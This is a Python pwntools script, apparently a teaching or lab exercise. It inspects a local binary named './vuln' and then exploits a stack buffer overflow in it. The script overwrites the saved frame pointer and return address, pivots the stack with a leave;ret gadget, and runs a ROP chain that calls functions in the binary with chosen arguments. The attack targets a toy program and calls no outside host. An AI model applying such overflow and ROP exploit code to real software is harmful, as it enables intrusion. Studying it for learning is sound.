#!/usr/bin/env python

"""
Highlight pwntools (https://github.com/Gallopsled/pwntools) functionality on
multiple executables.
"""

from pwn import *

# Change to 'debug' for extensive information on classes used.
context.log_level = 'debug'


"""
Do ELF inspection.
"""

e = ELF("./vuln")

# Set context according to binary.
context.binary = "./vuln"

# Print ELF class/instance attributes.
log.debug("ELF class members: {:s}".format(dir(ELF)))
log.debug("ELF instance attributes: {:s}".format(e.__dict__))

# Print local function address.
log.info("main at 0x{:0x}, diablo at 0x{:0x}".format(e.symbols["main"], e.symbols["diablo"]))

# Print global variable address, offset and value.
g_address = e.symbols["g"]
g_offset = e.vaddr_to_offset(g_address)
g_value = unpack(e.read(g_address, 8))
log.info("g at 0x{:0x}, offset is 0x{:0x} value: 0x{:0x}".format(g_address, g_offset, g_value))

g_array_address = e.symbols["g_array"]
log.info("g_array at 0x{:0x}".format(g_array_address))


"""
Do overflow and alter execution flow.
"""

# Offset to return address was computed using get_offset.py.
offset = 64
leave_ret_address = 0x00000000004005f8

# Create payload to overwrite return address with address of warcraft().
payload = offset * "A"
payload += pack(g_array_address) # RBP <- g_array_address
payload += pack(leave_ret_address) # RIP <- leave + ret gadget
# leave: (mov rsp, rbp) RSP <- RBP (g_array_address) ; the stack pivoting happens here (the secondary payload stored in g_array_address)
#        (pop rbp) RBP <- 8 * "B"
# ret:  whatever is on the secondary_payload

warcraft_address = e.symbols["warcraft"]
diablo_address = e.symbols["diablo"]
starcraft_puts_address = 0x40060f

pop_rdi_ret = 0x0000000000400713
pop_rsi_r15_ret = 0x0000000000400711

secondary_payload = 8 * "B" + \
        pack(warcraft_address) + \
        pack(starcraft_puts_address) + \
        8 * "C" + pack(pop_rdi_ret) + pack(0x12345678) + \
        pack(pop_rsi_r15_ret) + pack(0xaabbccdd) + 8 * "D" + \
        pack(diablo_address)

# Start process
io = process("./vuln")

# Read banner information and send secondary_payload.
msg = io.recvline()       # Read "hello, blizzard!" banner.
print "banner: ", msg
io.sendline(secondary_payload)
print "sent secondary payload"
gdb.attach(io)
io.sendline(payload)
print "sent payload"

# Read "gimme message: ..." prompt + payload. The prompt isn't flushed
# by the time we send the payload, so we read it here, together with the
# payload.
io.interactive()
